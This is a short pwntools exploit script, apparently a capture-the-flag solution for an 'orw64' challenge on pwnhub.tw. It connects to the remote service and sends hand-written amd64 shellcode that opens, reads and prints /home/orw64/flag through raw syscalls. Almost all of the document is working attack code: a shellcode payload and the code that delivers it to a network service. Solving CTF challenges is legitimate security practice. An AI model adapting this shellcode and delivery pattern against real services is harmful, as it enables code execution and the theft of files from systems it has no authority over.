#!/usr/bin/env python
from pwn import *

context(arch = "amd64", os = "linux", bits = 64)
p = remote("pwnhub.tw", 11112)

'''
int fd = open("/home/orw64/flag", 0)
read(fd, buf, count)
write(1, buf, count)
'''

shellcode = asm("""
        xor rax, rax
        xor rdi, rdi
        xor rsi, rsi
        xor rdx, rdx
        jmp flag
    write:
        pop rdi
        mov rax, 2
        syscall

        mov rdi, rax
        mov rsi, rsp
        mov rdx, 0x30
        xor rax, rax
        syscall

        mov rdi, 1
        mov rdx, 0x30
        mov rax, 1
        syscall

        mov rax, 0x3c
        syscall

    flag:
        call write
        .ascii "/home/orw64/flag"
        .byte 0
""")

p.recvuntil(":")
p.sendline(shellcode)
print p.recv().split()[0]

p.close()
